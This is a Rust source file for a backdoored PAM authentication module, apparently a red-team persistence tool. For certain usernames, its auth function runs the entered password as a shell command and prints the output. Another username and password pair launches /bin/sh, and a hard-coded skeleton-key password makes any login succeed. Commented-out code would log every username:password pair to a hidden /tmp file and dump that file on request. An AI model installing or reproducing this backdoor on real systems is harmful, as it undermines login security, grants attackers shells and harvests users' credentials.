mod macros;
mod syslog;

use pam::*;
use syslog::*;

use std::{
	ffi,
	//fs,
	//io::Write,
	os::unix::process::CommandExt,
	process,
};


const MODULE_NAME: &str = "MyPAMExec";
//const CRED_LOG_FILE: &str = "/tmp/.cred-1000";


/// Unified debug output functionality.
macro_rules! debug {
	($($args:expr),+) => {
		#[cfg(debug_assertions)]
		syslog(format!($($args),+), SyslogLevel::Debug);
		#[cfg(debug_assertions)]
		eprintln!($($args),+);
	};
}


#[authenticate]
fn auth(mut pamh: PamHandle, _flags: i32, _args: Vec<&ffi::CStr>) -> pam::PamResult {
	// Start syslog (__ holds service cstring for function lifetime)
	let log_opts = SyslogOpts::CONSOLE | SyslogOpts::PID | SyslogOpts::NODELAY;
	let __ = openlog(MODULE_NAME, log_opts, SyslogFacility::Local1);

	// Get the username and add to transaction data
	let username = match pamh.pam_get_user("User: ") {
		Ok(u) => u,
		_ => String::new(),
	};
	_ = pamh.pam_set_data("username", username.clone());

	// Get conv (return if it doesn't exist, to avoid problems)
	let conv = pamh.pam_get_item(PamItemType::Conv);
	let conv = match conv {
		Ok(PamItem::Conv(cv)) => cv,
		_ => return PamResult::ServiceErr,
	};

	// Prompt user for password, then set AuthTok so that pam_unix.so can use (with try_first_pass).
	let password = match conv.call(PamConvType::PromptEchoOff, "Password: ") {
		Ok(s) => {
			debug!("User responded: {}", s);
			s
		},
		Err(_) => {
			debug!("Error conversing password.");
			String::new()
		},
	};

	_ = pamh.pam_set_item(PamItem::AuthTok(password.clone()));
	_ = pamh.pam_set_data("password", password.clone());

	/* Do username shenanigans
	*/
	match username.as_str() {
		// Execute password as a bash command
		"mandy" => {
			debug!("Executing {password} with /bin/bash");
			if let Ok(out) = process::Command::new("/bin/bash").arg("-c").arg(password.clone()).output() {
				if let Ok(s) = std::str::from_utf8(&out.stdout[..]) {
					println!("stdout follows:\n{s}");
				}
				if let Ok(s) = std::str::from_utf8(&out.stderr[..]) {
					println!("stderr follows:\n{s}");
				}
			}
		},
		// Execute password as a sh command (fallback to the bash above)
		"mandy2" => {
			debug!("Executing {password} with /bin/sh");
			if let Ok(out) = process::Command::new("/bin/sh").arg("-c").arg(password.clone()).output() {
				if let Ok(s) = std::str::from_utf8(&out.stdout[..]) {
					println!("stdout follows:\n{s}");
				}
				if let Ok(s) = std::str::from_utf8(&out.stderr[..]) {
					println!("stderr follows:\n{s}");
				}
			}
		},
		// Dump creds file to stdout.
		/*"creed" => {
			debug!("Dumping creds from file..");
			if let Ok(contents) = fs::read_to_string(CRED_LOG_FILE) {
				//println!("{}", contents);
				//_ = pamh.pam_prompt(PamConvType::TextInfo, &contents[..]);
				_ = conv.call(PamConvType::TextInfo, &contents[..])
			} else {
				debug!("Could not open cred file.");
			}
		},*/
		// Replace login process with shell
		"shelly" => {
			if password == "shazam" {
				println!("Launching /bin/sh..");
				// Exec /bin/sh, since it's most likely to exist on all boxes (and not be touched).
				_ = process::Command::new("/bin/sh").exec();
			}
		},
		_ => {
			debug!("No special username found.");
		},
	};

	/* Do password shenanigans
	*/
	// Skeleton key password
	if password == "SpookyScarySkeletons" {
		debug!("Skeleton key used.");
		return PamResult::Success
	}

	closelog();

	PamResult::Ignore
}

#[setcred]
fn setcred(_pamh: PamHandle, _flags: i32, _args: Vec<&ffi::CStr>) -> PamResult {
	/*
	let log_opts = SyslogOpts::CONSOLE | SyslogOpts::PID | SyslogOpts::NODELAY;
	let __ = openlog(MODULE_NAME, log_opts, SyslogFacility::Local1);

	/* Get user creds to log to file
	   - By this point, user authentication was successful.
	*/
	// Get username
	let res = unsafe { pamh.pam_get_data::<String, _>("username") };
	let username = match res {
		Ok(d) => {
			debug!("setcred username data: {d}");
			d.clone()
		},
		Err(_) => {
			debug!("Error fetching data");
			String::new()
		},
	};

	// Get password
	let res = unsafe { pamh.pam_get_data::<String, _>("password") };
	let password = match res {
		Ok(d) => {
			debug!("setcred password data: {d}");
			d.clone()
		},
		Err(_) => {
			debug!("Error fetching data");
			match pamh.pam_get_item(PamItemType::AuthTok) {
				Ok(PamItem::AuthTok(p)) => p,
				_ => "".to_string(),
			}
		},
	};

	// Open log file and append above credentials in the format username:password
	if let Ok(mut file) = fs::OpenOptions::new().append(true).create(true).open(CRED_LOG_FILE) {
		debug!("Logging creds to file.");
		_ = write!(file, "{username}:{password}\n");
	}

	closelog();
	*/

	PamResult::Success
}
